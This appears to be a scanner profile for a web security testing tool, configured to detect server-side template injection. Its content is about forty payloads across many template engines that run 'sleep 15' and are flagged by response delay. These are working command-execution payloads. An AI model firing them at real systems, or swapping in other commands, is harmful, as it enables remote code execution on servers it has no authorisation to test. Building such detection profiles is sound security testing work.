[
  {
    "ProfileName": "SSTI - Sleep",
    "Name": "",
    "Enabled": false,
    "Scanner": 1,
    "Author": "",
    "Payloads": [
      "true,{{ request.application.__globals__[\u0027os\u0027].popen(\u0027sleep 15\u0027).read() }}",
      "true,{{ self.__init__.__globals__.__builtins__.__import__(\u0027os\u0027).popen(\u0027sleep 15\u0027).read() }}",
      "true,{{ \u0027\u0027.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[\u0027os\u0027].popen(\u0027sleep 15\u0027).read() }}",
      "true,\u003c% import os %\u003e\u003c%\u003d os.popen(\u0027sleep 15\u0027).read() %\u003e",
      "true,\u003c% import subprocess %\u003e\u003c%\u003d subprocess.check_output(\u0027sleep 15\u0027, shell\u003dTrue).decode() %\u003e",
      "true,{% import os %}{{ os.popen(\u0027sleep 15\u0027).read() }}",
      "true,{% import subprocess %}{{ subprocess.check_output([\u0027sleep\u0027, \u002715\u0027]) }}",
      "true,{{ \u0027sleep 15\u0027|filter(\u0027system\u0027) }}",
      "true,{{ \u0027sleep 15\u0027|filter(\u0027exec\u0027) }}",
      "true,{{ _self.env.registerUndefinedFilterCallback(\u0027exec\u0027) }}{{ _self.env.getFilter(\u0027exec\u0027)(\u0027sleep 15\u0027) }}",
      "true,{php}echo `sleep 15`;{/php}",
      "true,{php}system(\u0027sleep 15\u0027);{/php}",
      "true,\u003c#assign ex\u003d\"freemarker.template.utility.Execute\"?new()\u003e${ex(\"sleep 15\")}",
      "true,\u003c#assign runtime\u003d\"java.lang.Runtime\"?new().getRuntime()\u003e${runtime.exec(\"sleep 15\")}",
      "true,#set($rt \u003d $system.getRuntime()) #set($process \u003d $rt.exec(\"sleep 15\")) #set($line \u003d $process.getInputStream().readLine()) $line",
      "true,$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"sleep 15\")",
      "true,#set($str \u003d $system.getClass().forName(\"java.lang.String\")) #set($exec \u003d $system.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\", null).invoke(null, null).exec(\"sleep 15\"))",
      "true,${T(java.lang.Runtime).getRuntime().exec(\u0027sleep 15\u0027)}",
      "true,${T(java.lang.ProcessBuilder).newInstance(\u0027sleep\u0027,\u002715\u0027).start()}",
      "true,{% set runtime \u003d \"java.lang.Runtime\".getRuntime() %}{{ runtime.exec(\"sleep 15\") }}",
      "true,{% set pb \u003d \"java.lang.ProcessBuilder\"?new([\"sleep\", \"15\"]) %}{{ pb.start() }}",
      "true,\u003c%\u003d system(\u0027sleep 15\u0027) %\u003e",
      "true,\u003c%\u003d `sleep 15` %\u003e",
      "true,\u003c%- `sleep 15` %\u003e",
      "true,\u003d `sleep 15`",
      "true,\u003c% require(\u0027child_process\u0027).exec(\u0027sleep 15\u0027, function(error, stdout, stderr) { console.log(stdout) }); %\u003e",
      "true,\u003c% require(\u0027child_process\u0027).execSync(\u0027sleep 15\u0027).toString() %\u003e",
      "true,- var exec \u003d require(\u0027child_process\u0027).exec; - exec(\u0027sleep 15\u0027, function(error, stdout, stderr) { console.log(stdout); });",
      "true,- var execSync \u003d require(\u0027child_process\u0027).execSync; - execSync(\u0027sleep 15\u0027);",
      "true,\u003c%\u003d \"sleep 15\".execute().text %\u003e",
      "true,\u003c% \"sleep 15\".execute() %\u003e",
      "true,@scala.sys.process.Process(\"sleep 15\").!!",
      "true,@scala.sys.process.Process(Seq(\"sleep\", \"15\")).!",
      "true,\u003c% os.execute(\"sleep 15\") %\u003e",
      "true,\u003c% io.popen(\"sleep 15\"):read(\"*a\") %\u003e",
      "true,{{#with (nodeProcess) }}{{ execSync \"sleep 15\" }}{{/with}}",
      "true,{{{ (require \u0027child_process\u0027).execSync(\u0027sleep 15\u0027) }}}",
      "true,{{ `sleep 15` | js_eval }}",
      "true,{% assign cmd \u003d \"sleep 15\" %}{{ cmd | shell }}"
    ],
    "Encoder": [
      "URL-encode key characters"
    ],
    "UrlEncode": false,
    "CharsToUrlEncode": "",
    "Grep": [],
    "Tags": [
      "All"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "14",
    "TimeOut2": "20",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "MatchType": 5,
    "Scope": 0,
    "RedirType": 0,
    "MaxRedir": 0,
    "payloadPosition": 2,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "SSTI - Sleep",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      18,
      65,
      32,
      36,
      7,
      1,
      2,
      6,
      33,
      5,
      35,
      34,
      64,
      0,
      3,
      4,
      37,
      127,
      65,
      32,
      36,
      7,
      1,
      2,
      6,
      33,
      5,
      35,
      34,
      64,
      0,
      3,
      4,
      37,
      127
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false
  }
]